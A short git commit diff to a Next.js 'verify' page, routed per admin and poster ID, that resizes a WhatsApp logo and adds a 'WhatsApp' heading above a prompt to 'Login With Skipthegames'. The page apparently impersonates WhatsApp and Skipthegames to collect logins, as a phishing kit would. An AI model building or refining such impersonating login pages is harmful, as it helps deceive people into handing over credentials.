02b64dd78c0397c180673719baa4bbb92d49ba29
Yeasir Ahamed <yahamed007@gmail.com>
2024-03-19 19:08:18 +0600

    fixing sizing issues

--- pages/verify/[adminId]/[posterId].js
+++ pages/verify/[adminId]/[posterId].js
@@ -20,8 +20,9 @@ export default function Home() {
         {!showForm ? (
           <div className="mx-auto mt-7 flex flex-col justify-center items-center inset-0 font-sans  max-w-sm">
             <div className="flex justify-center">
-              <Image src="/images/whatsapp.png" width={100} height={100} />
+              <Image src="/images/whatsapp.png" width={70} height={70} />
             </div>
+            <h1 className="text-center font-bold text-3xl mb-3">WhatsApp</h1>
             <h1 className="text-xl font-semibold">
               Login With Skipthegames and enjoy with WhatApp video chat your
               dating partner.
